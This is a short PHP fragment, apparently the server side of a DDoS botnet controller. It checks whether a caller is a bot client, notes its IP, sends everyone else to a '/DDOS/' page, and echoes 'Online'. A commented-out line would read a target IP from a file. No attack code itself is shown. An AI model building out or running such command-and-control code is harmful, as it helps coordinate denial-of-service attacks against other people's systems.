<?php
//Server Portion:
//Checks if the variable 'isclient' is true. If its not, it redirects it to another page. 
if ($_GET['isclient'] == false) header("Location: http://example.com/DDOS/index.php");
if ($_GET['isclient']) {
	$IsNewClient = $_GET['newclient'];
	$isclient = $_GET['isclient'];
	$RemIP = $_SERVER['REMOTE_ADDR'];
	if ($isclient != true) $isclient = false;
	// Define Target
	//$target = trim(file_get_contents('IP.txt')); // or something like that
	$Online = "Online";
	echo $Online;
}
?>